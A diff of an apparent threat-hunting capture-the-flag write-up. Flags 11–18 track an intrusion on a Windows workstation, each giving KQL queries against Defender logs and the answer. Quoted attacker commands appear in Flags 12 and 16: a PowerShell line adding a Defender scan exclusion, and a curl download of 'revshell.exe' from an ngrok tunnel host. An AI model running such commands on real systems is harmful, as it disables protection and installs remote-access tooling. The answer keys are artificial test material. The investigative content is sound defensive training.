@@ -227,45 +227,148 @@ DeviceRegistryEvents
 
 ---
 
-**Objective:**
+***FLAG 11 — Privilege Escalation Event Timestamp***
 
-**Flag:**
+**Objective:** During the intrusion, the attacker executed a simulated privilege-escalation action inside the MaintenanceRunner sequence. Locate the exact Timestamp (UTC) of the FIRST ConfigAdjust privilege-escalation event.
 
+**Flag:** `2025-11-23T03:47:21.8529749Z`
+```
+DeviceEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-11-10) .. datetime(2025-12-13))
+| where AdditionalFields has "ConfigAdjust"
+| project TimeGenerated, ActionType, AdditionalFields
+| sort by TimeGenerated asc
+```
+<img width="927" height="72" alt="image" src="https://github.com/user-attachments/assets/84940aee-0bf7-4d5c-9a87-3bbae2f495ac" />
 
-**Objective:**
+---
 
-**Flag:**
+***FLAG 12 — Identify the AV Exclusion Attempt***
 
+**Objective:** Your investigation reveals that the attacker attempted to modify Windows Defender settings to exclude a specific folder from real-time scanning. What folder path did the attacker attempt to add as an exclusion in Windows Defender?
 
-**Objective:**
+**Flag:** `"cmd.exe" /c echo powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath C:\ProgramData\Corp\Ops\staging -Force > ".cli"`
+```
+DeviceProcessEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-11-25) .. datetime(2025-12-13))
+| where ProcessCommandLine has_any ("ExclusionPath")
+| project TimeGenerated, ActionType, ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="1195" height="85" alt="image" src="https://github.com/user-attachments/assets/c0d29e32-6929-4a4f-a8e3-210eb0c0fec4" />
 
-**Flag:**
+---
 
+***FLAG 13 — PowerShell Encoded Command Execution***
 
-**Objective:**
+**Objective:** During the intrusion, a PowerShell process executed using the -EncodedCommand flag. What decoded PowerShell command was executed First?
 
-**Flag:**
+**Flag:** `Write-Output 'token-6D5E4EE08227'`
+```
+DeviceProcessEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
+| where AccountName !in ("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE")
+| where ProcessCommandLine has "-EncodedCommand"
+| extend Enc = extract(@"-EncodedCommand\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
+| extend Decoded = base64_decode_tostring(Enc)
+| project TimeGenerated, AccountName, ProcessCommandLine, Decoded
+| sort by TimeGenerated asc
+```
+<img width="942" height="77" alt="image" src="https://github.com/user-attachments/assets/6662dcb3-e19e-4ef5-94d8-f175eacf37c0" />
 
+---
 
-**Objective:**
+***Flag 14 — Privilege Token Modification***
 
-**Flag:**
+**Objective:** Windows recorded a ProcessPrimaryTokenModified event, a behavior consistent with attackers attempting to escalate privileges or adjust token integrity to blend in with SYSTEM-level processes. Which process actually performed that token modification? What is the "InitiatingProcessId" of the process whose token privileges were modified?
 
+**Flag:** `4888`
+```
+DeviceEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
+| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
+| project TimeGenerated, AdditionalFields, InitiatingProcessId
+| order by TimeGenerated asc
+```
+<img width="957" height="72" alt="image" src="https://github.com/user-attachments/assets/848ac182-7495-4f5b-914a-27f48c4b0e62" />
 
-**Objective:**
+---
 
-**Flag:**
+***FLAG 15 - Whose Token Was Modified?***
 
+**Objective:** If an attacker is adjusting privileges on the local Administrator token, that significantly raises the risk profile of any follow-on activity. Which security identifier (SID) did the modified token belong to?
 
-**Objective:**
+**Flag:** `S-1-5-21-1605642021-30596605-784192815-1000`
+```
+DeviceEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
+| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
+| extend ParsedFields = parse_json(AdditionalFields)
+| extend OriginalTokenUserSid = tostring(ParsedFields.OriginalTokenUserSid)
+| project TimeGenerated, OriginalTokenUserSid, InitiatingProcessId, AdditionalFields
+| order by TimeGenerated asc
+```
+<img width="1010" height="72" alt="image" src="https://github.com/user-attachments/assets/e7a2cb22-ab53-4712-935d-7477bdd99af0" />
 
-**Flag:**
+---
 
+***FLAG 16 – Ingress Tool Transfer from External Dynamic Tunnel***
 
-**Objective:**
+**Objective:** After the privilege escalation, Defender recorded a new executable being written to disk on CH-OPS-WKS02. The timing and location of this file suggest it was delivered as staging material for follow-on activity. Your job is to identify the exact filename the attacker introduced. What is the name of the executable that was written to disk after the outbound request?
 
-**Flag:**
+**Flag:** `"curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe`
+```
+DeviceFileEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
+| where InitiatingProcessCommandLine has_any ("curl.exe")
+| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="1007" height="102" alt="image" src="https://github.com/user-attachments/assets/46007b79-3b40-4745-a805-9daca9711403" />
 
+---
+
+***FLAG 17 — Identify the External Download Source***
+
+**Objective:** Before the suspicious file appeared on the workstation, the host reached out to an external dynamic-tunnel domain using curl.exe. This outbound request fetched the executable later used in post-escalation activity. Identify the exact remote URL involved in this transfer. What URL did the workstation connect to when retrieving the file?
+
+**Flag:** `https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe`
+```
+DeviceFileEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-13))
+| where InitiatingProcessCommandLine has_any ("curl.exe")
+| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="1007" height="102" alt="image" src="https://github.com/user-attachments/assets/46007b79-3b40-4745-a805-9daca9711403" />
+
+---
+
+***FLAG 18 — Execution of the Staged Unsigned Binary***
+
+**Objective:** Shortly after the file was retrieved from the external tunnel, Defender recorded its execution on CH-OPS-WKS02. The binary did not originate from any trusted software distribution channel and was launched directly from the user’s profile directory. This execution event marks the attacker’s shift from staging to actively running their tooling. Which process executed the downloaded binary on CH-OPS-WKS02?
+
+**Flag:** `explorer.exe`
+```
+DeviceFileEvents
+| where DeviceName == "ch-ops-wks02"
+| where TimeGenerated between (datetime(2025-12-02) .. datetime(2025-12-13))
+| where FileName == "windowsdefender--threat-.lnk"
+| project TimeGenerated, DeviceName, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="927" height="92" alt="image" src="https://github.com/user-attachments/assets/7fdb902c-6c40-49e3-9fea-054f9e85ac93" />
+
+---
+
+***FLAG 19 — Identify the External IP Contacted by the Executable***
 
 **Objective:**
 
